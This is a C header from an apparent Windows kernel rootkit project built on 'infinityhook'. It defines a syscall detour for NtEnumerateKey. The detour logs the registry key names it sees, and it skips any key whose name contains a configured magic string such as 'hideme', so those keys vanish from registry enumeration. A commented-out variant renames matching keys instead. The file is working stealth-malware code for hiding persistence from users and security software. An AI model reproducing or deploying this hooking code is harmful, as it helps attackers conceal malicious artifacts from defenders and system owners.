#pragma once
#include "Settings.h"
#include "utils.h"

// source: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_key_information_class
//typedef enum _KEY_INFORMATION_CLASS {
//	KeyBasicInformation,			// 0
//	KeyNodeInformation,				// 1
//	KeyFullInformation,				// 2
//	KeyNameInformation,				// 3
//	KeyCachedInformation,			// 4
//	KeyFlagsInformation,			// 5
//	KeyVirtualizationInformation,	// 6
//	KeyHandleTagsInformation,		// 7
//	KeyTrustInformation,			// 8
//	KeyLayerInformation,			// 9
//	MaxKeyInfoClass					// 10
//} KEY_INFORMATION_CLASS;

// source: http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FKey%2FNtQueryKey.html
typedef NTSTATUS(*NtEnumerateKey_t)(
	_In_ HANDLE KeyHandle,
	_In_ ULONG Index,
	_In_ KEY_INFORMATION_CLASS KeyInformationClass,
	_Out_ PVOID KeyInformation,
	_In_ ULONG Length,
	_Out_ PULONG ResultLength
);

static UNICODE_STRING StringNtEnumerateKey = RTL_CONSTANT_STRING(L"NtEnumerateKey");
static NtEnumerateKey_t OriginalNtEnumerateKey = NULL;

NTSTATUS DetourNtEnumerateKey(
	_In_ HANDLE KeyHandle,
	_In_ ULONG Index,
	_In_ KEY_INFORMATION_CLASS KeyInformationClass,
	_Out_ PVOID KeyInformation,
	_In_ ULONG Length,
	_Out_ PULONG ResultLength)
{
	//kprintf("[+] infinityhook: NtEnumerateKey, class %d, index: %d\n", KeyInformationClass, Index);
	if (KeyInformationClass == 0) {
		NTSTATUS status = OriginalNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
		if (NT_SUCCESS(status)) {
			kprintf("[+] infinityhook: NtEnumerateKey, class %d, index %d, after successful call, ResultLength: %d, KeyHandle: %p\n", KeyInformationClass, Index, *ResultLength, KeyHandle);
			PKEY_BASIC_INFORMATION KeyBasicInformationPtr = (PKEY_BASIC_INFORMATION)KeyInformation;
			//kprintf("[+] infinityhook: NtEnumerateKey: NameLength: %d\n", KeyBasicInformationPtr->NameLength);

			wchar_t NameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
			// ->NameLength / 2 , because the field is size in bytes but contains wchars (which consist of 2 bytes each)
			for (size_t i = 0; i < KeyBasicInformationPtr->NameLength / 2 && i < MAX_PATH_SYSHOOKER; ++i) {
				NameBuffer[i] = KeyBasicInformationPtr->Name[i];
			}
			kprintf("[+] infinityhook: NtEnumerateKey: NameLength: %d, Name: %ws\n", KeyBasicInformationPtr->NameLength, NameBuffer);
			
			// try to get info about the handle
			PrintRegistryKeyHandleInformation(KeyHandle, L"NtEnumerateKey");

			// if the key contains 'hideme', change it to 'xideme'
			/*if (wcsstr(NameBuffer, Settings.RegistryKeyMagicName)) {
				KeyBasicInformationPtr->Name[0] = L'x';
			}*/
			
			// if the key contains 'hideme', return ANOTHER CALL of NtEnumerateKey
			if (wcsstr(NameBuffer, Settings.RegistryKeyMagicName)) {
				return OriginalNtEnumerateKey(KeyHandle, Index + 1, KeyInformationClass, KeyInformation, Length, ResultLength);
			}

		}
		return status;
	}
	else return OriginalNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
	//else if (KeyInformationClass == 4) {
	//	NTSTATUS status = OriginalNtEnumerateKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
	//	if (NT_SUCCESS(status)) {
	//		kprintf("[+] infinityhook: NtEnumerateKey, class %d, after successful call, ResultLength: %d\n", KeyInformationClass, *ResultLength);
	//		PKEY_CACHED_INFORMATION KeyCachedInformationPtr = (PKEY_CACHED_INFORMATION)KeyInformation;
	//		kprintf("[+] infinityhook: NtEnumerateKey: SubKeys: %ul, MaxNameLen: %ul, Values: %ul, NameLength: %ul\n", KeyCachedInformationPtr->SubKeys, KeyCachedInformationPtr->MaxNameLen, KeyCachedInformationPtr->Values, KeyCachedInformationPtr->NameLength);

	//		/*wchar_t NameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
	//		for (size_t i = 0; i < KeyNameInformationPtr->NameLength && i < MAX_PATH_SYSHOOKER; ++i) {
	//			NameBuffer[i] = KeyNameInformationPtr->Name[i];
	//		}
	//		kprintf("[+] infinityhook: NtEnumerateKey: Name: %ws\n", NameBuffer);*/
	//	}
	//	return status;
	//}
	//else {
	//	//kprintf("[+] infinityhook: In Detoured NtEnumerateKey, class: %d\n", KeyInformationClass);
	//	// call the original
	//	//return OriginalNtEnumerateKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
	//}
}